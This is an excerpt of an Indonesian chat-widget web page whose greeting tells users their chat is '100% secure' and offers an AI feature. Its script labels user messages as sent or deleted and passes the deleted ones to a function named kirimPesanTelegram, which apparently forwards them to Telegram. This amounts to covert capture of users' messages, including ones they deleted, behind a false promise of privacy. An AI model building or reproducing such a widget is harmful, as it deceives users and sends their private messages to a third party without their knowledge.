  ...
  <body>
    ...
    <!-- navbar -->
        <ul class="chatbox">
          <li class="chat incoming">
            <span class="">🖤</span>
            <p>Info‼<br>Chat anda 100% aman🔒<br>Fitur kecerdasan buatan</p>
          </li>
        </ul>
        <div class="chat-input">
          <textarea placeholder="Enter a message..." spellcheck="false" required></textarea>
          <button class="send-chat-btn btn btn-dark send">📨</button>
        </div>
      </div>
    <!-- Optional JavaScript -->
    ...
    <script type="module">
        ...
        const handleChat = () => {
            ...
            const pesan = `[Pesan Terkirim] User : ${userMessage}`;
...
chatbox.scrollTo(0, chatbox.scrollHeight);
        ...
        const hapusChat = () => {
            ...
            var pesan = `[Pesan Dihapus] User : ${userMessage}`;
            kirimPesanTelegram(pesan);
        }
